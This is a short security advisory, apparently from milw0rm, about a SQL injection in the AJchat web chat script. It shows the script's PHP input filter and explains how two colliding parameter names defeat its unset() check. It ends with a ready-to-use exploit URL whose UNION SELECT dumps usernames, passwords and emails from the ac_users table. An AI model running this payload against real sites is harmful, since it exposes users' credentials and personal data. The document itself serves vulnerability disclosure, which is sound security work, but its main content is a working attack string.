@@ -1,0 +1,36 @@
+----[ AJchat Remote Sql Injection using unset() bug ... ITDefence.ru Antichat.ru ]
+
+							AJchat Remote Sql Injection using unset() bug
+							Eugene Minaev underwater@itdefence.ru 
+				___________________________________________________________________
+			____/  __ __ _______________________ _______  _______________    \  \   \
+			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
+			/ /     /_//              /\        /       /      /         /     /___/
+			\/        /              / /       /       /\     /         /         /
+			/        /               \/       /       / /    /         /__       //\
+			\       /    ____________/       /        \/    __________// /__    // /   
+			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
+			\ \\                                                               // // /
+			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
+			. \_\\________[________________________________________]_________//_//_/ . .
+			
+		<?php
+		if (isset($_GET["s"])){
+		$_GET["s"] = strtoupper($_GET["s"]);
+		if (strlen($_GET["s"])==1 && $_GET["s"]>='A' && $_GET["s"]<='Z'){
+		// nothing
+		}else unset($_GET['s']);
+		} 
+		?>
+		
+		As we can see , $_GET['s'] can include only A..Z characters , in other way script unset() it.
+		
+		calc.exe s
+		5861526=1
+		5863704=1
+		
+		directory.php?s='and 1 = 2 union select concat_ws(char(59),id,username,password,email),null+from+ac_users/*&5861526=1&5863704=1
+
+----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]
+
+# milw0rm.com [2008-01-11]
